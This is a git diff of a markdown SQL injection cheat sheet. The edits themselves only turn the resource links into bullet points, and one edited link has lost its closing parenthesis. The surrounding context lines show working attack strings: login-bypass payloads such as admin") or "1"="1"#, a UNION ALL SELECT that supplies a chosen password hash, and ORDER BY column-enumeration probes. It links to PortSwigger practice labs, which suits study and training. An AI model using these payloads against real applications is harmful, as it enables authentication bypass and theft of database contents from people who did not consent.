@@ -1,5 +1,5 @@
 # Resources
-[Learn about SQL injection](https://portswigger.net/web-security/sql-injection)
+- [Learn about SQL injection](https://portswigger.net/web-security/sql-injection)
 
 # Payloads
 
@@ -10,7 +10,7 @@
 ' --
 
 ```
-[Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+- [Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
 
 ## Login bypassing
 Note: Remember, sometimes you have to repleace 'admin' for another username. Here, 'admin' is just an example.
@@ -111,8 +111,8 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
-[How to bypass login authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)
-[Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+- [How to bypass login authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication
+- [Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
 
 ## Determining the number of columns returned by the query with UNION SELECT NULL-- -
 ```sql
@@ -174,4 +174,4 @@ etc...
 ' ORDER BY 12-- -
 etc...
 ```
-[Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+- [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
